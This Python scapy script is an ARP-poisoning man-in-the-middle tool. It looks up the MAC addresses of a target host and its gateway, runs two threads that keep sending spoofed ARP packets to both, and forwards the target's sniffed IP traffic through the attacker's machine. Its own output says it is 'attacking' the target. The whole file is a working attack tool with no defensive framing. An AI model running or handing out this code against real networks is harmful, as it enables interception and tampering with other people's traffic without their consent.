#!/usr/bin/env python
# -*- coding: utf-8 -*-

# gateway proxy tool by arp poisoning

from scapy.all import *
from scapy.layers.l2 import Ether, ARP
from scapy.layers.inet import IP
from scapy.layers.dns import DNSRR, DNS, DNSQR

import time
import threading
import os

BCAST_MAC = 'ff:ff:ff:ff:ff:ff'


# get mac address by ip and interface
def get_mac(ip, iface):
    result = ''
    mac = get_if_hwaddr(iface)
    arp_req = Ether(src=mac, dst=BCAST_MAC) / ARP(pdst=ip)
    ans, unans = srp(arp_req, timeout=2, iface=iface)

    if ans:
        res, res = ans[0]
        return res.getlayer(Ether).src

    return result


def arp_poison(dst_ip, dst_mac, fake_ip):
    while True:
        sendp(Ether(dst=dst_mac) /
            ARP(op='who-has', psrc=fake_ip, pdst=dst_ip),
            verbose=False)
        time.sleep(0.1)


# 1. send received ip packet ip.src = TARGET_IP and ip.dst = GATEWAY && eth.dst = SELF_MAC
# 2. send received ip packet ip.dst = TARGET_IP && eth.dst == SELF_MAC


def bridge(iface, target_ip, target_mac, gateway_ip, gateway_mac, self_mac):
    def route(x):
        if x.getlayer(IP).dst == target_ip:
            # send to gateway
            # request from device

            # print dns query
            y = Ether(dst=target_mac) / x.getlayer(IP)
            sendp(y, verbose=False)
        else: 
            y = Ether(dst=gateway_mac) / x.getlayer(IP)
            sendp(y, verbose=False)

    sniff(
        iface=iface,
        count=0,
        lfilter=lambda x: IP in x and x.getlayer(Ether).dst == self_mac and
        (
            x.getlayer(IP).src == target_ip or
            x.getlayer(IP).dst == target_ip 
        ),
        prn=route
    )


if __name__ == '__main__':
    # provide device ip and gateway ip here
    GATEWAY_IP = os.environ.get('GATEWAY_IP') or '192.168.1.1'
    TARGET_IP = os.environ.get('TARGET_IP') or '192.168.1.2'
    IFACE = os.environ.get('IFACE') or get_if_list()[0]

    print(f"try to run as gateway proxy, attacking {TARGET_IP}, where gateway ip = {GATEWAY_IP} interface = {IFACE}")

    # provider your iface
    SELF_MAC = get_if_hwaddr(IFACE)

    TARGET_MAC = ''
    GATEWAY_MAC = ''

    while TARGET_MAC == '':
        TARGET_MAC = get_mac(TARGET_IP, IFACE)
        time.sleep(1)

    print(f'target mac address = {TARGET_MAC}')

    while GATEWAY_MAC == '':
        GATEWAY_MAC = get_mac(GATEWAY_IP, IFACE)
        time.sleep(1)

    print(f'gateway mac address = {GATEWAY_MAC}')

    # create arp_poison threads
    t = threading.Thread(target=arp_poison,
        args=(TARGET_IP, TARGET_MAC, GATEWAY_IP)
    )
    t.start()

    t = threading.Thread(target=arp_poison,
        args=(GATEWAY_IP, GATEWAY_MAC, TARGET_IP)
    )
    t.start()

    bridge(IFACE, TARGET_IP, TARGET_MAC, GATEWAY_IP, GATEWAY_MAC, SELF_MAC)
